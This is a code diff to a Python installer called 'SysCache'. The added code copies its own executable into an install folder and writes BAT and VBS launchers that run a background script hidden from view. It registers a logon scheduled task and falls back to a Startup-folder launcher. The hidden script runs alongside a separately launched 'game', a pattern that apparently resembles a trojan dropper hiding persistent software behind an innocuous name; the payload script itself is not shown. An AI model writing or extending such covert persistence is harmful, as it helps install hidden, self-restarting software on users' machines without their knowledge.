@@ -7,6 +7,7 @@ from typing import List, Optional
 
 APP_NAME = "SysCache"
 MAC_LABEL = "com.syscache"
+WINDOWS_TASK_NAME = "SysCacheLauncher"
 
 SYSTEM = platform.system()
 IS_WINDOWS = SYSTEM == "Windows"
@@ -69,6 +70,19 @@ def copy_optional_file_to_install(filename: str) -> Optional[str]:
         return None
 
 
+def copy_self_executable_to_install() -> str:
+    if not getattr(sys, "frozen", False):
+        return sys.executable
+
+    source_executable = os.path.abspath(sys.executable)
+    target_executable = os.path.join(INSTALL_DIR, "syscache_runtime.exe")
+
+    if os.path.abspath(target_executable) != source_executable:
+        shutil.copy2(source_executable, target_executable)
+
+    return target_executable
+
+
 def get_windows_python_command() -> List[str]:
     if shutil.which("python"):
         return ["python"]
@@ -114,9 +128,26 @@ def show_windows_message(message: str, title: str = "SysCache Installer") -> Non
         pass
 
 
-def build_startup_bat(main_script_path: str) -> str:
+def _format_bat_command(command: List[str], script_path_var: str = "%SCRIPT_PATH%") -> str:
+    parts = []
+    for item in command:
+        escaped = item.replace('"', '""')
+        if any(char in escaped for char in (" ", "\t", "&", "(", ")", "^")):
+            parts.append(f'"{escaped}"')
+        else:
+            parts.append(escaped)
+    parts.append(f'"{script_path_var}"')
+    return " ".join(parts)
+
+
+def build_startup_bat(
+    main_script_path: str,
+    background_python_cmd: Optional[List[str]] = None,
+    frozen_exe_path: Optional[str] = None,
+) -> str:
     if getattr(sys, "frozen", False):
-        escaped_exe = sys.executable.replace('"', '""')
+        runtime_exe = frozen_exe_path or sys.executable
+        escaped_exe = runtime_exe.replace('"', '""')
         return f'''@echo off
 wmic process get CommandLine | find /I "{RUN_MAIN_ARG}" >nul
 if %errorlevel%==0 (
@@ -127,33 +158,121 @@ exit /b 0
 '''
 
     escaped_path = main_script_path.replace('"', '""')
+    preferred_cmd = _format_bat_command(background_python_cmd) if background_python_cmd else ""
+    preferred_block = ""
+    if preferred_cmd:
+        preferred_block = (
+            'echo [INFO] Tentando comando preferencial: '
+            + preferred_cmd.replace("%", "%%")
+            + '>>"%LOG_FILE%"\n'
+            f'start "" /b {preferred_cmd}\n'
+            "if %errorlevel%==0 (\n"
+            '    echo [OK] Comando preferencial iniciado com sucesso.>>"%LOG_FILE%"\n'
+            "    exit /b 0\n"
+            ")\n"
+            'echo [WARN] Falha no comando preferencial (errorlevel=%errorlevel%).>>"%LOG_FILE%"\n'
+        )
     return f'''@echo off
+setlocal
 set "SCRIPT_PATH={escaped_path}"
+for %%I in ("%SCRIPT_PATH%") do set "SCRIPT_DIR=%%~dpI"
+if defined SCRIPT_DIR cd /d "%SCRIPT_DIR%"
+set "LOG_FILE=%SCRIPT_DIR%startup.log"
+echo.>>"%LOG_FILE%"
+echo ===== [%date% %time%] Inicializacao do startup =====>>"%LOG_FILE%"
+echo [INFO] SCRIPT_PATH=%SCRIPT_PATH%>>"%LOG_FILE%"
 wmic process get CommandLine | find /I "%SCRIPT_PATH%" >nul
 if %errorlevel%==0 (
+    echo [INFO] Script ja estava em execucao.>>"%LOG_FILE%"
     exit /b 0
 )
+{preferred_block}
 where pyw >nul 2>nul
 if %errorlevel%==0 (
+    echo [INFO] Tentando pyw.>>"%LOG_FILE%"
     start "" /b pyw "%SCRIPT_PATH%"
     exit /b 0
 )
 
 where pythonw >nul 2>nul
 if %errorlevel%==0 (
+    echo [INFO] Tentando pythonw.>>"%LOG_FILE%"
     start "" /b pythonw "%SCRIPT_PATH%"
     exit /b 0
 )
 
 where py >nul 2>nul
 if %errorlevel%==0 (
+    echo [WARN] pyw/pythonw nao encontrados; tentando py -3.>>"%LOG_FILE%"
     start "" /b py -3 "%SCRIPT_PATH%"
     exit /b 0
 )
 
-start "" /b python "%SCRIPT_PATH%"
+where python >nul 2>nul
+if %errorlevel%==0 (
+    echo [WARN] pyw/pythonw nao encontrados; tentando python.>>"%LOG_FILE%"
+    start "" /b python "%SCRIPT_PATH%"
+    exit /b 0
+)
+
+echo [ERROR] Nenhum launcher Python encontrado no PATH.>>"%LOG_FILE%"
 exit /b 0
 '''
+
+
+def build_startup_vbs(bat_path: str) -> str:
+    escaped_bat_path = bat_path.replace('"', '""')
+    return f'''Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run Chr(34) & "{escaped_bat_path}" & Chr(34), 0, False
+'''
+
+
+def build_startup_proxy_vbs(target_vbs_path: str) -> str:
+    escaped_target_vbs = target_vbs_path.replace('"', '""')
+    return f'''Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run Chr(34) & "{escaped_target_vbs}" & Chr(34), 0, False
+'''
+
+
+def register_windows_startup_task(vbs_path: str) -> None:
+    system_root = os.environ.get("SystemRoot", r"C:\Windows")
+    wscript_path = os.path.join(system_root, "System32", "wscript.exe")
+    task_command = f'"{wscript_path}" //B //Nologo "{vbs_path}"'
+
+    subprocess.run(
+        [
+            "schtasks",
+            "/Create",
+            "/SC",
+            "ONLOGON",
+            "/TN",
+            WINDOWS_TASK_NAME,
+            "/TR",
+            task_command,
+            "/F",
+        ],
+        check=True,
+        capture_output=True,
+        text=True,
+    )
+
+
+def remove_startup_folder_launchers() -> None:
+    for filename in ("syscache_launcher.bat", "syscache_launcher.vbs"):
+        launcher_path = os.path.join(STARTUP_DIR, filename)
+        if os.path.exists(launcher_path):
+            try:
+                os.remove(launcher_path)
+                log_install(f"Launcher legado removido da pasta Startup: {launcher_path}")
+            except OSError as error:
+                log_install(f"Falha ao remover launcher legado ({launcher_path}): {error}")
+
+
+def create_startup_folder_fallback(vbs_path: str) -> str:
+    fallback_vbs_path = os.path.join(STARTUP_DIR, "syscache_launcher.vbs")
+    with open(fallback_vbs_path, "w", encoding="utf-8") as fallback_vbs:
+        fallback_vbs.write(build_startup_proxy_vbs(vbs_path))
+    return fallback_vbs_path
 
 
 def run_bundled_main_script() -> None:
@@ -185,12 +304,32 @@ def install_windows() -> None:
     background_python_cmd = get_windows_background_python_command()
 
     os.makedirs(STARTUP_DIR, exist_ok=True)
-    bat_path = os.path.join(STARTUP_DIR, "syscache_launcher.bat")
-
-    with open(bat_path, "w", encoding="utf-8") as f:
-        f.write(build_startup_bat(main_script_path))
+    bat_path = os.path.join(INSTALL_DIR, "syscache_launcher.bat")
+    vbs_path = os.path.join(INSTALL_DIR, "syscache_launcher.vbs")
 
     is_frozen_exe = getattr(sys, "frozen", False)
+    runtime_exe_path = copy_self_executable_to_install() if is_frozen_exe else None
+    if runtime_exe_path:
+        log_install(f"Runtime EXE copiado para: {runtime_exe_path}")
+
+    with open(bat_path, "w", encoding="utf-8") as f:
+        f.write(build_startup_bat(main_script_path, background_python_cmd, runtime_exe_path))
+    with open(vbs_path, "w", encoding="utf-8") as f:
+        f.write(build_startup_vbs(bat_path))
+    log_install(f"Launcher BAT criado em: {bat_path}")
+    log_install(f"Launcher VBS criado em: {vbs_path}")
+    remove_startup_folder_launchers()
+    try:
+        register_windows_startup_task(vbs_path)
+        log_install(f"Tarefa agendada criada/atualizada: {WINDOWS_TASK_NAME}")
+    except subprocess.CalledProcessError as error:
+        fallback_vbs_path = create_startup_folder_fallback(vbs_path)
+        log_install(
+            "Falha ao criar tarefa agendada. "
+            f"Usando fallback da pasta Startup: {fallback_vbs_path}. "
+            f"Erro: {error.stderr or error}"
+        )
+
     if not is_frozen_exe and not python_cmd:
         warning = (
             "Python não foi encontrado no PATH. O instalador concluiu a cópia dos arquivos, "
@@ -206,7 +345,7 @@ def install_windows() -> None:
         if not is_main_script_running(main_script_path):
             if is_frozen_exe:
                 subprocess.Popen(
-                    [sys.executable, RUN_MAIN_ARG],
+                    [runtime_exe_path or sys.executable, RUN_MAIN_ARG],
                     shell=False,
                     creationflags=creationflags,
                     env=get_frozen_child_env(),
@@ -222,7 +361,7 @@ def install_windows() -> None:
             log_install("main_script já estava em execução. Não será iniciado novamente.")
 
         if is_frozen_exe:
-            subprocess.Popen([sys.executable, RUN_GAME_ARG], shell=False, env=get_frozen_child_env())
+            subprocess.Popen([runtime_exe_path or sys.executable, RUN_GAME_ARG], shell=False, env=get_frozen_child_env())
             log_install("Inicialização disparada com executável empacotado.")
         else:
             subprocess.Popen([*python_cmd, game_path], shell=False)
